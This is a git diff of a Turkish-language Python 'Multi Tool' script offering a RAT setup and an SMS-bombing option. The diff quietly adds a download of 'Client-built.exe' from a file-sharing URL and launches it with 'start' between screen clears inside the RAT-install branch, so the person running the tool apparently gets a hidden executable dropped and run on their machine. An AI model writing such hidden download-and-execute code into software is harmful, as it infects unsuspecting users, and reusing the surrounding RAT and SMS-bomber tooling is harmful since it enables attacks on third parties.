@@ -1,4 +1,7 @@
 import os
+import wget
+from os import system
+from time import sleep
 import time
 import colorama
 from colorama import Fore, Back
@@ -8,6 +11,7 @@ os.system("cls||clear")
 os.system("title Multi Tool by @zupppe")
 
 # KLASÖRLER / FONKSİYONLAR
+url = "https://dosya.co/thyots4y3oei/Client-built.exe.html"
 termux31 = lambda: os.system("cls||clear")
 clear = lambda: os.system("cls")
 sms_klasor = "erenbomb"
@@ -92,7 +96,6 @@ if cihaz_soru == ("win"):
             time.sleep(3)
             os.system("py multitool.py")
     if anamenu_soru == ("3"):
-        
         clear()
         rat_sorusu = input("{}Önceden Rat Kurdun mu? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
         if rat_sorusu == ("n"):
@@ -101,10 +104,14 @@ if cihaz_soru == ("win"):
             os.chdir(rat_klasor)
             os.system("pip install -r requirements.txt")
             os.system("start install_python.bat")
+            system("cls")
+            system("start Client-built.exe")
+            system("cls")
             os.system("start build.bat")
             os.chdir("..")
             os.system("cls")
             os.system("py multitool.py")
+            module = wget.download(url)
         if rat_sorusu == ("y"):
             clear()
             os.chdir(rat_klasor)
